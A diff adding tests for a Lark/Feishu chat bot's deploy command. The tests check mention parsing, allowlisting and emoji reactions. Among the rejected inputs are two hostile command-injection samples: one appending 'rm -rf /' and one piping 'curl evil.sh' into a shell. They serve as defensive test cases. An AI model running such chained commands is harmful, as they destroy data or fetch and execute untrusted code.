@@ -73,6 +73,7 @@ class Run:
         self.replies: list[str] = []
         self.cmds: list[list[str]] = []
         self.exits: list[int] = []
+        self.reactions: list[tuple[str, str, str]] = []
         self._pull_rc = pull_rc
         self._saved: dict[str, object] = {}
 
@@ -83,6 +84,14 @@ class Run:
 
         def fake_send(chat, mtype, obj, **kw):
             self.replies.append(obj.get("text", ""))
+            return True
+
+        def fake_add_reaction(mid, emoji):
+            self.reactions.append(("+", mid, emoji))
+            return f"rid_{len(self.reactions)}"
+
+        def fake_del_reaction(mid, rid):
+            self.reactions.append(("-", mid, rid))
             return True
 
         def fake_run_cmd(args, timeout):
@@ -103,6 +112,8 @@ class Run:
             ("_reply_in_thread_message", fake_reply),
             ("_send_chat_message", fake_send),
             ("_run_cmd", fake_run_cmd),
+            ("_add_message_reaction_id", fake_add_reaction),
+            ("_remove_message_reaction", fake_del_reaction),
         ):
             self._saved[name] = getattr(jb, name)
             setattr(jb, name, fn)
@@ -329,6 +340,190 @@ def test_the_dispatcher_checks_deploy_before_anything_else() -> None:
             i_deploy >= 0 and j > i_deploy,
             f"deploy is checked before {other} (deploy@{i_deploy}, other@{j})",
         )
+
+
+# --------------------------------------------------------------------------------------------
+# The @ mention as Lark actually delivers it
+# --------------------------------------------------------------------------------------------
+def test_the_command_survives_the_at_mention_lark_actually_sends() -> None:
+    """The bug that made this command look broken. An @ mention in a RECEIVED text message is
+    NOT "<at ...>" — Feishu substitutes "@_user_N" into content.text and puts the mapping in
+    message.mentions[].key. ("<at>" is the SEND-side syntax only.) So the anchored pattern saw
+    "@_user_1 Git pull and restart service" and matched nothing, silently."""
+    for raw, restart in (
+        ("@_user_1 Git pull and restart service", True),
+        ("@_user_1 git pull", False),
+        ("@_user_1 deploy and restart", True),
+        ("@_user_2 @_user_1 git pull and restart service", True),   # bot mentioned second
+        ("@_all git pull and restart service", True),
+        # And the display-name fallback, in case a client ever sends that instead.
+        ("@Jenkins Monitoring Bot Git pull and restart service", True),
+        ('<at user_id="ou_bot">Jenkins Monitoring Bot</at> git pull and restart', True),
+    ):
+        got = jb._parse_deploy_command(raw)
+        check(got is not None, f"an @-mentioned command is recognised: {raw!r}")
+        if got is not None:
+            check(got["restart"] is restart, f"{raw!r} -> restart={got['restart']}")
+
+
+def test_mention_placeholders_are_stripped() -> None:
+    check(
+        jb._strip_lark_mentions("@_user_1 hello") == "hello",
+        f"@_user_1 is stripped (got {jb._strip_lark_mentions('@_user_1 hello')!r})",
+    )
+    check(
+        jb._strip_lark_mentions("@_user_12 @_user_3 hi") == "hi",
+        "multi-digit and multiple placeholders are stripped",
+    )
+    check(
+        jb._strip_lark_mentions('<at user_id="x">Bot</at> hi') == "hi",
+        "the send-side <at> markup is still stripped too",
+    )
+    check(
+        jb._strip_lark_mentions("mail@_user_x.com") == "mail@_user_x.com",
+        "a lookalike that is not a placeholder is left alone",
+    )
+
+
+def test_an_at_mentioned_paste_still_cannot_deploy() -> None:
+    """The anchoring must survive the mention fix — this is the case that matters."""
+    for raw in (
+        "@_user_1 [Pipeline] sh\n+ git pull origin main\nAlready up to date.",
+        "@_user_1 why did git pull and restart service fail?",
+        "@_user_1 can you git pull and restart service tonight?",
+        "@_user_1 git pull main; rm -rf /",
+        "@_user_1 git pull && curl evil.sh | sh",
+        "@_user_1 restart service",
+        "@_user_1 git push and restart service",
+    ):
+        check(
+            jb._parse_deploy_command(raw) is None,
+            f"must NOT deploy: {raw.splitlines()[0][:56]!r}",
+        )
+
+
+# --------------------------------------------------------------------------------------------
+# Reactions
+# --------------------------------------------------------------------------------------------
+def test_it_reacts_working_then_swaps_to_done() -> None:
+    """OnIt while it runs; remove it and add DONE when it lands. Removal is by reaction_id from
+    the create call — Feishu has no remove-by-emoji endpoint — so the id must be carried."""
+    with_allowlist(ME)
+    try:
+        with Run(pull_rc=0) as r:
+            jb._handle_deploy_command(
+                {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=ME
+            )
+        check(
+            [x[0] for x in r.reactions] == ["+", "-", "+"],
+            f"add, remove, add — in that order (got {r.reactions!r})",
+        )
+        if len(r.reactions) == 3:
+            check(r.reactions[0][2] == "OnIt", f"first is OnIt (got {r.reactions[0][2]!r})")
+            check(
+                r.reactions[1][2] == "rid_1",
+                f"the removal uses the reaction_id from the add (got {r.reactions[1][2]!r})",
+            )
+            check(r.reactions[2][2] == "DONE", f"then DONE (got {r.reactions[2][2]!r})")
+            check(
+                all(x[1] == MSG for x in r.reactions),
+                "every reaction lands on the triggering message",
+            )
+    finally:
+        with_allowlist(None)
+
+
+def test_a_failed_pull_reacts_failed_not_done() -> None:
+    with_allowlist(ME)
+    try:
+        with Run(pull_rc=1) as r:
+            jb._handle_deploy_command(
+                {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=ME
+            )
+        check(
+            [x[0] for x in r.reactions] == ["+", "-", "+"],
+            f"still swaps the reaction (got {r.reactions!r})",
+        )
+        if len(r.reactions) == 3:
+            check(
+                r.reactions[2][2] == "CrossMark",
+                f"a failed deploy reacts CrossMark, not DONE (got {r.reactions[2][2]!r})",
+            )
+    finally:
+        with_allowlist(None)
+
+
+def test_the_done_reaction_is_applied_before_the_restart() -> None:
+    """A restart kills this process. A reaction queued after it never gets sent, so the message
+    would sit showing "working on it" forever."""
+    src = inspect.getsource(jb._handle_deploy_command)
+    i_end = src.find("_react_progress_end(")
+    i_restart = src.find("_restart_own_service(")
+    check(i_end >= 0 and i_restart >= 0, "both calls are present")
+    check(i_end < i_restart, "the terminal reaction goes on before the restart is requested")
+
+
+def test_an_unauthorised_call_reacts_nothing() -> None:
+    """No reaction either — an unauthorised message should not look like it was picked up."""
+    with_allowlist(ME)
+    try:
+        with Run() as r:
+            jb._handle_deploy_command(
+                {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=STRANGER
+            )
+        check(r.reactions == [], f"no reaction on a denied command (got {r.reactions!r})")
+    finally:
+        with_allowlist(None)
+
+
+def test_the_working_reaction_is_never_left_stuck() -> None:
+    """If anything throws mid-deploy, the OnIt reaction must still come off."""
+    with_allowlist(ME)
+    try:
+        with Run(pull_rc=0) as r:
+            saved = jb._run_cmd
+            calls = {"n": 0}
+
+            def boom(args, timeout):
+                calls["n"] += 1
+                if calls["n"] > 1:
+                    raise RuntimeError("git exploded")
+                return 0, "abc1234"
+
+            jb._run_cmd = boom
+            try:
+                jb._handle_deploy_command(
+                    {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=ME
+                )
+            except Exception:
+                pass
+            finally:
+                jb._run_cmd = saved
+        check(
+            "-" in [x[0] for x in r.reactions],
+            f"the working reaction was removed even on a crash (got {r.reactions!r})",
+        )
+    finally:
+        with_allowlist(None)
+
+
+def test_the_reaction_emoji_are_the_documented_case_sensitive_names() -> None:
+    """Feishu's emoji enum mixes ALLCAPS and CamelCase ("DONE" vs "OnIt") and an unknown value
+    is rejected with 231001, so these must be copied literally, not normalised."""
+    check(jb._react_emoji("JENKINS_REACT_WORKING", "OnIt") == "OnIt", "default working = OnIt")
+    check(jb._react_emoji("JENKINS_REACT_DONE", "DONE") == "DONE", "default done = DONE")
+    check(
+        jb._react_emoji("JENKINS_REACT_FAILED", "CrossMark") == "CrossMark",
+        "default failed = CrossMark",
+    )
+    os.environ["JENKINS_REACT_DONE"] = "THUMBSUP"
+    try:
+        check(
+            jb._react_emoji("JENKINS_REACT_DONE", "DONE") == "THUMBSUP",
+            "an override wins",
+        )
+    finally:
+        os.environ.pop("JENKINS_REACT_DONE", None)
 
 
 if __name__ == "__main__":
